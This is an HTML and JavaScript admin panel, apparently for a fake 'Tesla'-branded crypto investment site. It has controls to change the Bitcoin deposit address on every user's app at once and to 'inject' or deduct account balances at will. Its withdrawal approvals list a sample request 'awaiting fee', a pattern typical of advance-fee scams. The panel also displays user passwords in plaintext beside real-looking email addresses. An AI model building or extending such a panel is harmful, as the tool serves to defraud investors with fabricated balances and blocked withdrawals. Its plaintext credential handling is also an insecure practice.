<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Base | MASTER ADMIN</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --red: #E31937; --bg: #000; --card: #0d0d0d; --border: #1a1a1a; --green: #00ffa3; --gold: #f5cc91; }
        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; margin: 0; padding: 20px; }
        .section { background: var(--card); border: 1px solid var(--border); border-radius: 20px; padding: 25px; margin-bottom: 25px; }
        h2 { color: var(--red); font-size: 18px; text-transform: uppercase; margin-top: 0; display: flex; align-items: center; gap: 10px; }
        
        /* User Grid */
        .user-row { background: #111; border: 1px solid #222; border-radius: 15px; padding: 20px; margin-bottom: 15px; }
        .user-info { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; border-bottom: 1px solid #222; padding-bottom: 10px; }
        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        
        input { background: #000; border: 1px solid #333; color: #fff; padding: 12px; border-radius: 8px; width: 100%; box-sizing: border-box; }
        button { cursor: pointer; border: none; font-weight: 800; border-radius: 8px; transition: 0.2s; padding: 12px; }
        .btn-inject { background: var(--green); color: #000; }
        .btn-deduct { background: var(--red); color: #fff; }
        .btn-update { background: #fff; color: #000; width: 100%; margin-top: 10px; }

        /* Approval Tables */
        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 13px; }
        th { text-align: left; color: #555; padding: 10px; border-bottom: 1px solid #222; }
        td { padding: 15px 10px; border-bottom: 1px solid #1a1a1a; }
        .badge { padding: 4px 8px; border-radius: 4px; font-size: 10px; font-weight: 900; }
        .badge-pend { background: #ffa50033; color: orange; }
        
        .action-btns { display: flex; gap: 5px; }
        .approve { background: var(--green); color: #000; padding: 5px 10px; font-size: 11px; }
        .decline { background: var(--red); color: #fff; padding: 5px 10px; font-size: 11px; }
    </style>
</head>
<body>

    <div class="section">
        <h2><i class="fa-solid fa-wallet"></i> Global Wallet Update</h2>
        <div style="display:flex; gap:10px;">
            <input type="text" id="globalBtc" placeholder="Enter New Bitcoin Address">
            <button class="btn-inject" onclick="updateGlobalWallet()" style="white-space:nowrap;">UPDATE WALLET</button>
        </div>
        <p style="font-size:11px; color:#555; margin-top:10px;">This changes the deposit address on every user's app immediately.</p>
    </div>

    <div class="section">
        <h2><i class="fa-solid fa-users"></i> User Database & Direct Injection</h2>
        <div id="userContainer">
            </div>
    </div>
        <div class="section">
        <h2><i class="fa-solid fa-clock-rotate-left"></i> Pending Withdrawals</h2>
        <table>
            <thead>
                <tr>
                    <th>User Email</th>
                    <th>Amount</th>
                    <th>Method</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="withdrawTable">
                </tbody>
        </table>
    </div>

    <div class="section">
        <h2><i class="fa-solid fa-bolt"></i> Pending Investments</h2>
        <table>
            <thead>
                <tr>
                    <th>User</th>
                    <th>Plan</th>
                    <th>Capital</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="investTable">
                </tbody>
        </table>
    </div>

<script>
    // Sample Data - In production, this fetches from your Render/Node API
    let users = [
        { email: "newnessuzochukwu51@gmail.com", balance: 0, password: "user123" },
        { email: "sweetcsf1@gmail.com", balance: 5400, password: "pass888" }
    ];

    let pendingWithdraws = [
        { id: 101, email: "sweetcsf1@gmail.com", amount: 3500, method: "BTC", status: "awaiting fee" }
    ];

    function renderUsers() {
        const container = document.getElementById('userContainer');
        container.innerHTML = users.map(u => `
            <div class="user-row">
                <div class="user-info">
                    <div>
                        <b style="color:var(--gold)">${u.email}</b><br>
                        <small style="color:#666">Pass: ${u.password}</small>
                    </div>
                    <div style="text-align:right">
                        <span style="color:var(--green); font-weight:800;">$${u.balance.toLocaleString()}</span>
                    </div>
                </div>
                <div class="controls">
                    <input type="number" id="amt_${u.email.replace('@','_')}" placeholder="Amount ($)">
                    <div style="display:flex; gap:10px;">
                        <button class="btn-inject" style="flex:1" onclick="inject('${u.email}', 'add')">INJECT</button>
                        <button class="btn-deduct" style="flex:1" onclick="inject('${u.email}', 'sub')">DEDUCT</button>
                    </div>
                </div>
            </div>
        `).join('');
    }

    function renderWithdrawals() {
        const table = document.getElementById('withdrawTable');
        table.innerHTML = pendingWithdraws.map(w => `
            <tr>
                <td>${w.email}</td>
                <td>$${w.amount}</td>
                <td><span class="badge badge-pend">${w.status}</span></td>
                <td>
                    <div class="action-btns">
                        <button class="approve" onclick="action('withdraw', ${w.id}, 'success')">APPROVE</button>
                        <button class="decline" onclick="action('withdraw', ${w.id}, 'failed')">DECLINE</button>
                    </div>
                </td>
            </tr>
        `).join('');
    }

    // Admin Logic Functions
    function inject(email, type) {
        const amtInput = document.getElementById(`amt_${email.replace('@','_')}`);
        const val = parseFloat(amtInput.value);
        if(!val) return alert("Enter a valid amount");
        
        // This would call your API: /api/admin/inject
        alert(`${type === 'add' ? 'Injected' : 'Deducted'} $${val} from ${email}`);
        amtInput.value = "";
    }

    function action(type, id, status) {
        // Logic for "Payment Successful" or "Payment Failed"
        alert(`${type.toUpperCase()} Request ${id} updated to: ${status.toUpperCase()}`);
        // In the user's view, the history will update to this status.
    }

    function updateGlobalWallet() {
        const addr = document.getElementById('globalBtc').value;
        if(!addr) return alert("Enter address");
        alert("Global Deposit Address Updated to: " + addr);
    }

    window.onload = () => { renderUsers(); renderWithdrawals(); };
</script>
</body>
</html>
